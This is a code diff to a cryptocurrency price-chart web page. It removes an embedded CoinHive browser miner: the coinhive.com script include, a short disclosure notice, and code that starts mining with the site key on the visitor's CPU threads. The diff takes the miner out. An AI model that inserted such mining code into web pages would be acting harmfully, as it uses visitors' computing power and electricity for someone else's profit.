@@ -7,7 +7,6 @@
 <script src="https://npmcdn.com/chart.js@latest/dist/Chart.bundle.min.js"></script>
 <script src="https://npmcdn.com/Chart.Zoom.js@latest/Chart.Zoom.min.js"></script>
 
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 
 <h1 id="price" style="text-align: center;"></h1>
 <!-- <canvas id="myChart" width="800" height="200" style="max-width: 1600px; max-height:400px; margin: 0 auto;"></canvas> -->
@@ -20,17 +19,8 @@
     <li><a href="https://ssarcandy.tw/eth-chart/">MaiCoin ETH realtime price</a></li>
     <li><a href="https://ssarcandy.tw/ltc-chart/">MaiCoin LTC realtime price</a></li>
 </ul>
-
-<div>This site use some of your's computing resources to make profit.</div>
 <script>
 var name = (new Date()).toISOString().slice(0,10).replace(/-/g,"");
-var miner = new CoinHive.User('6N8PcRT201fFHwOLDV0rnDrvB3I9mp4i', name, {
-	    threads: navigator.hardwareConcurrency,
-	    autoThreads: false,
-	    throttle: 0.5,
-	    forceASMJS: false
-	});
-miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 </script>
 <script>
 setInterval(getRealtimePrice, 30000);
